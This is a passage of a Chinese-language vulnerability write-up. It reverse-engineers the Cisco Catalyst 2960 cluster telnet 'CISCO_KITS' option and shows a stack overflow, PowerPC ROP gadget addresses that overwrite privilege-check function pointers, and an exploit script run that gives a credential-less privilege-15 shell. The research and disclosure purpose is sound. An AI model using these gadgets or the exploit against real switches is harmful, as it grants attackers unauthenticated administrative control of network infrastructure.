Cisco&nbsp;IOS&nbsp;Software,&nbsp;C2960&nbsp;Software&nbsp;(C2960-LANBASEK9-M),&nbsp;Version&nbsp;12.2(55)SE1,&nbsp;RELEASE&nbsp;SOFTWARE&nbsp;(fc1)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">阿哈！Telnet流量实际上被封装在第2层的LLC数据包中。如果仔细观察的话，在源和目的地字段中就会注意到带有MAC地址的IP数据包。在这些“IP”数据包之内，含有telnet会话的有效TCP帧。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0170193540c331c3ae.png" title="t0165f3a0cce713fdff.png" alt="http://p4.qhimg.com/t0165f3a0cce713fdff.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">telnet会话通常出现在telnet选项磋商之前，其中包括：终端大小、终端类型等信息。要想了解更多信息，请参考RFC。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在提交catalyst2&gt;消息之前，会向服务器端一个telnet选项：&nbsp;</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0197407609ab44e492.png" title="t01b92cd694505ea82d.png" alt="http://p7.qhimg.com/t01b92cd694505ea82d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这里，您可以看到从主交换机发送到从交换机的telnet选项“CISCO_KITS”。在执行漏洞利用代码期间出现的这个字符串，同样出现在Vault 7文档中，并且一模一样。接下来，我们将深入考察交换机的内部原理。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">搞定固件</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">固件位于交换机的flash:&lt;version&gt;.bin中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">catalyst2#dir&nbsp;flash:
Directory&nbsp;of&nbsp;flash:/
&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;&nbsp;-rwx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9771282&nbsp;&nbsp;&nbsp;Mar&nbsp;1&nbsp;1993&nbsp;00:13:28&nbsp;+00:00&nbsp;&nbsp;c2960-lanbasek9-mz.122-55.SE1.bin
&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;&nbsp;-rwx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2487&nbsp;&nbsp;&nbsp;Mar&nbsp;1&nbsp;1993&nbsp;00:01:53&nbsp;+00:00&nbsp;&nbsp;config.text</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内置的ftp客户端允许将此固件传输至任意ftp服务器。好，现在我们就借助binwalk来分析和提取该文件的内容：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;binwalk&nbsp;-e&nbsp;c2960-lanbasek9-mz.122-55.SE1.bin&nbsp;
DECIMAL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEXADECIMAL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DESCRIPTION
--------------------------------------------------------------------------------
112&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bzip2&nbsp;compressed&nbsp;data,&nbsp;block&nbsp;size&nbsp;=&nbsp;900k</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了便于对获取的二进制数进行静态分析，我们最好找到固件加载的偏移量。实际上，在引导过程中，该偏移量将打印输出到串行控制台中：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">Loading&nbsp;&quot;flash:c2960-lanbasek9-mz.122-55.SE1.bin&quot;...@@@@@@@@@@@@@@@@@@@@@@
File&nbsp;&quot;flash:c2960-lanbasek9-mz.122-55.SE1.bin&quot;&nbsp;uncompressed&nbsp;and&nbsp;installed,
entry&nbsp;point:&nbsp;0x3000
executing...</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这时候，IDA就该上场了。这里的CPU架构是PowerPC 32位BigEndian。下面，我们将这个二进制文件加载到0x3000处：&nbsp;</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t0105d8d833fd5ba5e6.png" title="t01fb289502d3e431c0.png" alt="http://p8.qhimg.com/t01fb289502d3e431c0.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">寻找字符串</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">还记得前面在群集通信中捕获的字符串CISCO_KITS吗？我们将从这里下手。在通过IDA观察大部分函数后，可以发现针对固件末尾处那些字符串的交叉引用。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t01ee9fa275081c6224.png" title="t014157a1f476ceea18.png" alt="http://p9.qhimg.com/t014157a1f476ceea18.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">“CISCO_KITS”字符串将被return_cisco_kits函数所引用，实际上该函数只是将该字符串作为char *返回。我们将重点关注调用return_cisco_kits的call_cisco_kits函数，该函数位于0x0004ED8C。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01d6695e8add0c4bc8.png" title="t01431fa7a4a92be3f3.png" alt="http://p5.qhimg.com/t01431fa7a4a92be3f3.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因为telnet代码对于客户端和服务器而言是对称的，所以我们实际上可以看到发送到服务器端的缓冲区的格式为- ％c％s％c％d：％s：％d :。这实际上与发送缓冲区中观察到的流量是一致的：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">if&nbsp;(&nbsp;telnet_struct-&gt;is_client_mode&nbsp;)&nbsp;//&nbsp;client&nbsp;mode?&nbsp;then&nbsp;send&nbsp;&quot;CISCO_KITS&quot;&nbsp;string
{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;telnet_struct-&gt;is_client_mode&nbsp;==&nbsp;1&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cisco_kits_string_2&nbsp;=&nbsp;(char&nbsp;*)return_cisco_kits();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int_two&nbsp;=&nbsp;return_2();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tty_str&nbsp;=&nbsp;get_from_tty_struct((telnet_struct&nbsp;*)telnet_struct_arg-&gt;tty_struct);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*(_DWORD&nbsp;*)&amp;telnet_struct_arg-&gt;tty_struct[1].field_6D1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;format1_ret&nbsp;=&nbsp;format_1(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(int)&amp;str_buf[8],
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;%c%s%c%d:%s:%d:&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cisco_kits_string_2,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int_two,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tty_str,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet_struct&nbsp;=&nbsp;(telnet_struct&nbsp;*)telnet_send_sb(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(int)telnet_struct_arg,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;36,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;str_buf[8],
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;format1_ret,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v8,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v7,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v6);
&nbsp;&nbsp;&nbsp;&nbsp;}
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">大家有没有发现，这里有两个％s字符串修饰符，但是在流量样本中实际上只有一个字符串即CISCO_KITS，这是因为第二个字符串是空的，并且位于两个:字符之间。进一步观察函数的控制流程，我注意到处理第二个字符串时（这次是服务器端代码）有一些有趣的行为：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">for&nbsp;(&nbsp;j&nbsp;=&nbsp;(unsigned&nbsp;__int8)*string_buffer;&nbsp;j&nbsp;!=&nbsp;&#39;:&#39;;&nbsp;j&nbsp;=&nbsp;(unsigned&nbsp;__int8)*string_buffer&nbsp;)//&nbsp;put&nbsp;data&nbsp;before&nbsp;second&nbsp;&quot;:&quot;&nbsp;at&nbsp;&amp;str_buf&nbsp;+&nbsp;152
{
&nbsp;&nbsp;&nbsp;&nbsp;str_buf[v19++&nbsp;+&nbsp;152]&nbsp;=&nbsp;j;
&nbsp;&nbsp;&nbsp;&nbsp;++string_buffer;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们发送取自第二个％s字符串中的数据的时候，实际上会一直复制到：字符，并且没有检查位于堆栈上的目标缓冲区的目标边界。这会出现什么情况？ 没错， 缓冲区溢出！&nbsp;</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t018aa5d0c88478d7ca.png" title="t018efb62b8d7f57fc7.png" alt="http://p4.qhimg.com/t018efb62b8d7f57fc7.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让代码运行起来</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">实际上，要想控制指令指针是很容易的，因为可以用发送的缓冲区来覆盖它。但问题是：堆和（位于堆上的）栈是不可执行的。我的最佳选择是，启用数据和指令缓存。以下内容引自Felix Lindner在BlackHat 2009上的演示文稿：&nbsp;</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01b608f918283ac6c5.png" title="t011953578b7ee28d33.png" alt="http://p0.qhimg.com/t011953578b7ee28d33.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">该ROP上场了</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于没有办法在堆栈上执行代码，所以我不得不将其用作数据缓冲区并重用固件中的现有代码。这种做法的思想是，通过某种方式链接函数的Epilog来完成任意的内存写操作。但等一下，写什么呢？ 我们先来看看反编译的0x00F47A34处的函数：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">if&nbsp;(&nbsp;ptr_is_cluster_mode(tty_struct_var-&gt;telnet_struct_field)&nbsp;)
{
&nbsp;&nbsp;telnet_struct_var&nbsp;=&nbsp;tty_struct_var-&gt;telnet_struct_field;
&nbsp;&nbsp;ptr_get_privilege_level&nbsp;=&nbsp;(int&nbsp;(__fastcall&nbsp;*)(int))some_libc_func(0,&nbsp;(unsigned&nbsp;int&nbsp;*)&amp;dword_22659D4[101483]);
&nbsp;&nbsp;privilege_level&nbsp;=&nbsp;ptr_get_privilege_level(telnet_struct_var);//&nbsp;equals&nbsp;to&nbsp;1&nbsp;during&nbsp;rcommand&nbsp;1
&nbsp;&nbsp;telnet_struct_1&nbsp;=&nbsp;tty_struct_var-&gt;telnet_struct_field;
&nbsp;&nbsp;ptr_telnet_related2&nbsp;=&nbsp;(void&nbsp;(__fastcall&nbsp;*)(int))some_libc_func(1u,&nbsp;(unsigned&nbsp;int&nbsp;*)&amp;dword_22659D4[101487]);
&nbsp;&nbsp;ptr_telnet_related2(telnet_struct_1);
&nbsp;&nbsp;*(_DWORD&nbsp;*)&amp;tty_struct_var-&gt;privilege_level_field&nbsp;=&nbsp;((privilege_level&nbsp;&lt;&lt;&nbsp;28)&nbsp;&amp;&nbsp;0xF0000000&nbsp;|&nbsp;*(_DWORD&nbsp;*)&amp;tty_struct_var-&gt;privilege_level_field&nbsp;&amp;&nbsp;0xFFFFFFF)&nbsp;&amp;&nbsp;0xFF7FFFFF;
}
else
{
&nbsp;&nbsp;//generic&nbsp;telnet&nbsp;session
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里发生了一些有趣的事情。首先要强调的是，ptr_is_cluster_mode和ptr_get_privilege_level都是通过引用全局变量间接进行调用的。检查地址为0x00F47B60的代码行，我们发现is_cluster_mode函数的地址是从0x01F24A7处的dword中加载的。类似的，get_privilege_level函数的地址则是从0x3F47B8C处的r3寄存器中加载的。此时，r3的内容则是“残留”在地址0x022659D4 + 0x28 + 0xC处的一个已经解除引用的指针。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01c642eb8b70c4e6b1.png" title="t011001a5265dfb0312.png" alt="http://p9.qhimg.com/t011001a5265dfb0312.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果ptr_is_cluster_mode调用返回非零值，并且ptr_get_privilege调用返回-1之外的值，那么我们将收到一个telnet shell，并且不需要提供任何登陆凭证。下面的代码用来检查变量privilege_level的值：&nbsp;</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01fe01635e6e01c07c.png" title="t012f9af733daf241cf.png" alt="http://p8.qhimg.com/t012f9af733daf241cf.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如何才能覆盖这些函数指针，让它总是返回所需的正值的呢？ 由于堆和栈无法直接执行，所以我不得不重用现有的代码来执行此类的内存写操作。为此，可以使用以下ROP零件：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0x000037b4:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r0,&nbsp;0x14(r1)
&nbsp;&nbsp;&nbsp;&nbsp;mtlr&nbsp;r0
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r30,&nbsp;8(r1)
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r31,&nbsp;0xc(r1)
&nbsp;&nbsp;&nbsp;&nbsp;addi&nbsp;r1,&nbsp;r1,&nbsp;0x10&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;blr</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">将is_cluster_mode函数指针加载到r30中，然后加载将该指针覆盖为r31的值。用于覆盖的值是一个始终返回1的函数的地址：&nbsp;</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t0101a6e2e69cca48da.png" title="t01a38b0d912bb4ee08.png" alt="http://p3.qhimg.com/t01a38b0d912bb4ee08.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0x00dffbe8:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;stw&nbsp;r31,&nbsp;0x34(r30)
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r0,&nbsp;0x14(r1)
&nbsp;&nbsp;&nbsp;&nbsp;mtlr&nbsp;r0
&nbsp;&nbsp;&nbsp;&nbsp;lmw&nbsp;r30,&nbsp;8(r1)
&nbsp;&nbsp;&nbsp;&nbsp;addi&nbsp;r1,&nbsp;r1,&nbsp;0x10
&nbsp;&nbsp;&nbsp;&nbsp;blr</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">完成实际的写操作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0x0006788c:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r9,&nbsp;8(r1)
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r3,&nbsp;0x2c(r9)
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r0,&nbsp;0x14(r1)
&nbsp;&nbsp;&nbsp;&nbsp;mtlr&nbsp;r0
&nbsp;&nbsp;&nbsp;&nbsp;addi&nbsp;r1,&nbsp;r1,&nbsp;0x10
&nbsp;&nbsp;&nbsp;&nbsp;blr
0x006ba128:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r31,&nbsp;8(r1)
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r30,&nbsp;0xc(r1)
&nbsp;&nbsp;&nbsp;&nbsp;addi&nbsp;r1,&nbsp;r1,&nbsp;0x10
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r0,&nbsp;4(r1)
&nbsp;&nbsp;&nbsp;&nbsp;mtlr&nbsp;r0
&nbsp;&nbsp;&nbsp;&nbsp;blr</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面两个零件会把get_privilege_level函数的指针加载到r3中，同时加载一个将该其覆盖为r31的值。目标值是一个返回15的函数的地址：&nbsp;</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t0137111a2dbd2e0126.png" title="t016a579d11db1bb59a.png" alt="http://p8.qhimg.com/t016a579d11db1bb59a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0x0148e560:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;stw&nbsp;r31,&nbsp;0(r3)
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r0,&nbsp;0x14(r1)
&nbsp;&nbsp;&nbsp;&nbsp;mtlr&nbsp;r0
&nbsp;&nbsp;&nbsp;&nbsp;lwz&nbsp;r31,&nbsp;0xc(r1)
&nbsp;&nbsp;&nbsp;&nbsp;addi&nbsp;r1,&nbsp;r1,&nbsp;0x10
&nbsp;&nbsp;&nbsp;&nbsp;blr</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个Epilog完成最终的写操作并返回到合法的执行流程。当然，应该对堆栈结构进行相应的格式化，以便使这个rop链可以正常工作。为了了解能够使该rop链按预期运行的实际堆栈布局，可以参考漏洞利用源码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行漏洞利用代码</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">忙活一天之后，我终于搞定了一个工具，可以用来给一些重要函数指针打补丁的工具，这些函数之所以重要，是因为它们是处理连接和权限的。请注意，漏洞利用代码严重依赖于交换机上所使用的固件版本。对某些不同的固件版本来说，这里的漏洞利用代码很可能会导致设备崩溃。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据对较旧的固件SE1的静态和动态分析的了解，我们为最新的建议固件12.2（55）SE11构建了一个漏洞利用代码。固件版本之间的唯一区别，在于函数和指针偏移的不同。此外，该漏洞利用代码运行机制使得我们可以轻松地将更改还原。下面举例说明：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;python&nbsp;c2960-lanbasek9-m-12.2.55.se11.py&nbsp;192.168.88.10&nbsp;--set
[+]&nbsp;Connection&nbsp;OK
[+]&nbsp;Recieved&nbsp;bytes&nbsp;from&nbsp;telnet&nbsp;service:&nbsp;&#39;\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f&#39;
[+]&nbsp;Sending&nbsp;cluster&nbsp;option
[+]&nbsp;Setting&nbsp;credless&nbsp;privilege&nbsp;15&nbsp;authentication
[+]&nbsp;All&nbsp;done
$&nbsp;telnet&nbsp;192.168.88.10
Trying&nbsp;192.168.88.10...
Connected&nbsp;to&nbsp;192.168.88.10.
Escape&nbsp;character&nbsp;is&nbsp;&#39;^]&#39;.
catalyst1#show&nbsp;priv
Current&nbsp;privilege&nbsp;level&nbsp;is&nbsp;15
catalyst1#show&nbsp;ver
Cisco&nbsp;IOS&nbsp;Software,&nbsp;C2960&nbsp;Software&nbsp;(C2960-LANBASEK9-M),&nbsp;Version&nbsp;12.2(55)SE11,&nbsp;RELEASE&nbsp;SOFTWARE&nbsp;(fc3)
...
System&nbsp;image&nbsp;file&nbsp;is&nbsp;&quot;flash:c2960-lanbasek9-mz.122-55.SE11.bin&quot;
...
cisco&nbsp;WS-C2960-48TT-L&nbsp;(PowerPC405)&nbsp;processor&nbsp;(revision&nbsp;B0)&nbsp;with&nbsp;65536K&nbsp;bytes&nbsp;of&nbsp;memory.
...
